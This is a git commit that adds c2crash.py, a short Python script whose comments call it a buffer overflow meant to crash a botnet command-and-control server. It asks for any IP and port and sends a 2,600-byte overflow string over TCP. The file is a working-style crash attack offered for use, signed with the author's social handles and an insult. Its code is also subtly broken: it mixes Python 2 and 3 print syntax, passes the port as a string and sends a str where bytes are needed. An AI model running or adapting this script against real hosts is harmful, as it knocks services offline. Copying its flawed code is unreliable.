5f681b949d6b04b3ddfd2853bb275a69b4221ae6
Obstacles <70410324+obstacles1337@users.noreply.github.com>
2020-08-28 22:08:49 -0700

    Add files via upload

---
+++ c2crash.py
@@ -0,0 +1,27 @@
+# Date of write: 8/28/2020
+
+#Purpose of the script: a buffer overflow to crash the C2, so then they have to rescreen.
+
+#IG: @imdoxed 
+#OGU: obstacles 
+#Twitter: @ItsObstacles
+
+import socket 
+
+server_ip = input("IP: ")
+c2_port = input("C2 Port: ")
+
+print("Dropping {0}").format(server_ip)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #opens a TCP socket
+c2connection = s.connect((server_ip,c2_port))
+s.send('\x00\x00'+"A"*2600+'\r\n') #sending data
+s.close() #closing the TCP socket
+
+
+
+
+#This is a rewrite, just a tiny change to the orginal script. I dont remember the person who did the first write on this.
+
+
+#IHateBotnetRetards
+
